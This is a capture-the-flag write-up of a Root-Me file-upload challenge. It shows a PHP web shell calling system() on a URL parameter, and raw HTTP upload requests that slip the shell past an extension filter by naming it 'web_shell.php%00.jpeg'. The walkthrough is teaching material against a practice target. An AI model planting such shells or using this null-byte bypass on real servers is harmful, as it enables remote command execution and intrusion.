# File upload - Null byte(%00)

Reference:

https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/

First, I made

web shell

```
<?php
    system($_GET(cmd))
?>
```

\->

sent request

```
POST /web-serveur/ch22/?action=upload HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------75027602138922587731498905318
Content-Length: 260
Origin: http://challenge01.root-me.org
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch22/?action=upload
Cookie: PHPSESSID=bf96edb262cf6e4eabe229f5cef06c40; _ga_SRYSKX09J7=GS1.1.1662024800.33.1.1662024816.0.0.0; _ga=GA1.1.536088429.1661133467
Upgrade-Insecure-Requests: 1

-----------------------------75027602138922587731498905318
Content-Disposition: form-data; name="file"; filename="web_sh.php"
Content-Type: application/x-php

<?php
    system($_GET[cmd]);
?>

-----------------------------75027602138922587731498905318--
```

\->

modified Content-Type: image/jpeg

not working

\->

`<li>Stored in: <a href='./galerie/upload/bf96edb262cf6e4eabe229f5cef06c40/web_sh.php'>./galerie/upload/bf96edb262cf6e4eabe229f5cef06c40/web_sh.php</a></li></ul><p style='color: red'>Wrong extension !</p>`

\->

Then I search the web , found out that **null byte is used for input termination**

\->

then in order to bypass filter: it must have jpeg extension. while it should be activated: it must have php in it. then use null byte to the filter to quit reading extension at jpeg. mv web\_sh.php web\_sh.php%00.jpeg

\->

```
POST /web-serveur/ch22/?action=upload HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3610358801751984432588826005
Content-Length: 262
Origin: http://challenge01.root-me.org
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch22/?action=upload
Cookie: PHPSESSID=bf96edb262cf6e4eabe229f5cef06c40; _ga_SRYSKX09J7=GS1.1.1662024800.33.1.1662024816.0.0.0; _ga=GA1.1.536088429.1661133467
Upgrade-Insecure-Requests: 1

-----------------------------3610358801751984432588826005
Content-Disposition: form-data; name="file"; filename="web_shell.php%00.jpeg"
Content-Type: image/jpeg

<?php
    system($_GET[cmd]);
?>

-----------------------------3610358801751984432588826005--
```

\->

file is then uploaded
